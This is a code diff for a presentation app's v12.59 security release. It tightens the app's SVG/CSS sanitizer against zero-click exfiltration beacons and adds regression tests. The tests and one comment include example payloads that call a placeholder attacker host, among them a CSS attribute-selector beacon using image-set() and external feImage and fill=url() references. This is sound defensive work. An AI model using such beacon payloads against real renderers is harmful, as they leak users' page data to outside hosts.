@@ -69,8 +69,9 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.58";
+const VELA_VERSION = "12.59";
 const VELA_CHANGELOG = [
+  { v: "12.59", d: "Security (audit 2026-06, follow-up to v12.53): close the SVG <style>/CSS auto-load exfil class for good. Residual bypass: isSvgStyleSafe() only vetted url() tokens, so image-set(\"https://…\" 1x) — a string-source URL with no url() token — passed, kept the <style>, and fired a zero-click outbound GET on render (CSS attribute-selector exfil beacon). Same gap existed for image()/cross-fade()/src() and -webkit- prefixes. Three further auto-load holes found in the same pass: (a) non-anchor href allowed http/https, so <feImage href> (Roundcube CVE class) and external <image href> auto-fetched; (b) paint/filter/mask/marker/clip-path/cursor presentation attributes (e.g. fill=\"url(https://…)\") and the style=\"…\" attribute were not network-filtered; (c) image-block <img src> allowed http/https. Fixes, built on the principle that Vela decks load NOTHING external: (1) isSvgStyleSafe rejects any non-url() CSS function fed a string literal (function-name-agnostic — future image-ish functions can't reopen it); (2) href policy split — <a> keeps http/https/mailto/tel click navigation, every other href/xlink:href is same-document #fragment only; (3) new SVG_URL_REF_ATTRS run style + presentation attributes through isSvgStyleSafe; (4) image-block src restricted to data:image/* (no network), matching the branding-logo rule. url(#fragment) paint-server/gradient/marker refs and legitimate links preserved. CI: network-beacon battery added to tests/test_svg_mxss.cjs (image-set/image/cross-fade/src/escaped forms, feImage/image external href, fill=url(https), use data:) asserting zero non-fragment external references survive, plus a render-invariant + UI suite." },
   { v: "12.58", d: "PDF export: (1) Fix dark boxes behind module title-card badge/icon in the vector exporter — the title card's `bg` is a gradient string, so the composite-bg detector (which only matched rgba()/^#hex$) fell back to dark #0a0f1c and translucent badge/icon fills (#RRGGBBAA) alpha-blended to navy. Now derives the alpha-blend base from the gradient's first hex stop. (2) New 'Module title cards' toggle in the export dialog with a live count of enabled 🎬 present-cards; off filters the _virtual cards out of the exported PDF (raster + vector). Default on." },
   { v: "12.57", d: "PDF export now includes auto-generated module title cards (the 🎬 \"present card\") so exports match presentation mode exactly. Extracted buildTitleCardSlide() as the single source of truth shared by SlidePanel (presentation) and collectAllSlides (PDF/markdown). Title cards are inserted before each enabled module's slides and rendered without branding overlays; slide numbering excludes the cards (displayIndex/displayTotal) so real slides keep continuous 1-based numbers, matching the on-screen presentation." },
   { v: "12.56", d: "Release: version bump to publish desktop binaries with the merged security hardening (assemble.py script-context escape, SVG mutation-XSS fixes, deck-JSON sanitizer + fail-closed loads, and the Neutralino desktop blast-radius containment — strict CSP, minimal nativeAllowList with no os.spawnProcess, filesystem path guard, externally-authored-deck warning, and update notifier). No engine behavior change in this bump itself." },
@@ -391,6 +392,17 @@ const SVG_ALLOWED_TAGS = new Set([
   "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
 ]);
 
+// SVG attributes whose value can carry a functional URL reference that the
+// browser fetches automatically on render (zero-click). style="…" holds CSS;
+// the rest are paint/filter/mask/marker/clip-path/cursor presentation
+// attributes that accept url(…) / image-set(…) / etc. Each value is run through
+// isSvgStyleSafe() so only same-document url(#fragment) survives — no external
+// url(), no image-set()/image()/cross-fade()/src() string sources. (v12.59)
+const SVG_URL_REF_ATTRS = new Set([
+  "style", "fill", "stroke", "filter", "mask", "clip-path",
+  "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
+]);
+
 // SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
 // attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
 // render — zero-click exfil beacon with no CSP backstop inside the artifact
@@ -410,6 +422,18 @@ function isSvgStyleSafe(css) {
   if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
   const urls = css.match(/url\s*\([^)]*\)/gi);
   if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
+  // v12.59: reject any non-url() CSS function fed a string literal. image-set()/
+  // image()/cross-fade()/src() (and any future image-ish function) take a bare
+  // "https://…" string with NO url() token, so the url() check above misses them
+  // — a zero-click outbound GET (CSS-exfil beacon) on render. This shape
+  // (function-name + quote) is only ever a URL-by-string in CSS values:
+  // rgb()/calc()/var()/translate() never take strings, and font-family:"X" is a
+  // bare value, not a call. url(…) is the sole legitimate string-taking function
+  // and is already validated to be a #fragment above. Function-name-agnostic, so
+  // functions that don't exist yet cannot reopen this. Closes the residual
+  // image-set() bypass of the v12.53 url() exfil fix.
+  const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
+  if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
   return true;
 }
 
@@ -454,11 +478,17 @@ function sanitizeSvgMarkup(raw) {
             if (name === "href" || name === "xlink:href") {
               const norm = a.value.replace(/[\u0000-\u0020]+/g, "");
               const lower = norm.toLowerCase();
-              if (name === "xlink:href") {
-                if (!lower.startsWith("#")) { child.removeAttribute(a.name); continue; }
-              } else {
+              // <a href> = BUCKET B (click nav): http/https/mailto/tel only.
+              // Every OTHER href/xlink:href (image/feImage/use/tref/altGlyph/…) =
+              // BUCKET A (auto-fetched on render): same-document #fragment ONLY — no
+              // external, no data:, no blob:. Vela decks load nothing external. Closes
+              // <feImage href> (Roundcube-class) + external <image href> zero-click
+              // beacons the old http/https allowance left open on non-anchors. (v12.59)
+              if (name === "href" && tag === "a") {
                 const m = norm.match(/^([a-z][a-z0-9+\-.]*):/i);
                 if (m && !["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())) { child.removeAttribute(a.name); continue; }
+              } else if (!lower.startsWith("#")) {
+                child.removeAttribute(a.name); continue;
               }
             }
             const val = a.value.trim().toLowerCase();
@@ -466,7 +496,12 @@ function sanitizeSvgMarkup(raw) {
             const scheme = a.value.replace(/[\u0000-\u0020]+/g, "").toLowerCase();
             if ((name === "href" || name === "xlink:href") && (scheme.startsWith("javascript:") || scheme.startsWith("data:") || scheme.startsWith("vbscript:"))) { child.removeAttribute(a.name); continue; }
             if (name === "xlink:href" && !val.startsWith("#")) { child.removeAttribute(a.name); continue; }
-            if (name === "style" && (/url\s*\([^)]*(?:javascript|data|vbscript):/i.test(a.value) || /expression\s*\(/i.test(a.value))) { child.removeAttribute(a.name); continue; }
+            // BUCKET A — CSS / presentation references that auto-fetch on render:
+            // style="…" plus paint/filter/mask/marker/clip-path/cursor attributes.
+            // isSvgStyleSafe allows only url(#fragment); rejects external url(),
+            // image-set()/image()/cross-fade()/src() string sources, @import and CSS-
+            // escape obfuscation. Supersedes the prior style-only js/data check. (v12.59)
+            if (SVG_URL_REF_ATTRS.has(name) && !isSvgStyleSafe(a.value)) { child.removeAttribute(a.name); continue; }
           }
           walk(child);
         }
@@ -533,7 +568,13 @@ function sanitizeBlock(block) {
   if (clean.value) clean.value = sanitizeString(String(clean.value), 100);
   if (clean.title) clean.title = sanitizeString(clean.title, 500);
   if (clean.link) clean.link = sanitizeUrl(clean.link);
-  if (clean.src && clean.type === "image") clean.src = sanitizeUrl(clean.src, ["http:", "https:", "data:"]);
+  // Image block <img src> auto-fetches on render. Vela decks load nothing
+  // external, so restrict to inline data:image/* (no network, no data:text/html).
+  // Mirrors the branding-logo rule (data:-only). (v12.59)
+  if (clean.src && clean.type === "image") {
+    const s = sanitizeUrl(clean.src, ["data:"]);
+    clean.src = /^data:image\//i.test(s) ? s : "";
+  }
   if (Array.isArray(clean.items)) {
     if (clean.type === "bullets") {
       clean.items = clean.items.slice(0, 50).map((it) =>
@@ -8286,6 +8327,34 @@ uiSuite("SVG Sanitizer (XSS)", [
   { name: "SVG <style> with url(#fragment) preserved (paint-server refs)", fn: async () => {
     const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
     return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
+  }},
+  // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
+  // render. image-set/image/cross-fade/src were the residual bypass of the
+  // v12.53 url()-only filter. Vela decks load NOTHING external.
+  { name: "SVG <style> image-set() string source removed (beacon blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>[x^="V"]{background:image-set("https://attacker.invalid/b?p=V" 1x)}</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> -webkit-image-set / cross-fade / src() removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>a{background:-webkit-image-set("https://attacker.invalid/x" 1x)}b{x:cross-fade(url(#a),"https://attacker.invalid/y",50%)}c{x:src("https://attacker.invalid/z")}</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
+    const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG <feImage href> external removed (Roundcube class)", fn: async () => {
+    const out = sanitizeSvgMarkup('<filter><feImage href="https://attacker.invalid/b.png"/><feImage xlink:href="https://attacker.invalid/c.png"/></filter>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG #fragment paint refs + <a> https click-link preserved (v12.59)", fn: async () => {
+    const refs = sanitizeSvgMarkup('<rect fill="url(#grad)" clip-path="url(#c)"/>');
+    const link = sanitizeSvgMarkup('<a href="https://example.com/x"><text>hi</text></a>');
+    return /url\(#grad\)/.test(refs) && /url\(#c\)/.test(refs) && /href="https:\/\/example\.com\/x"/.test(link);
   }},
   { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
     const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
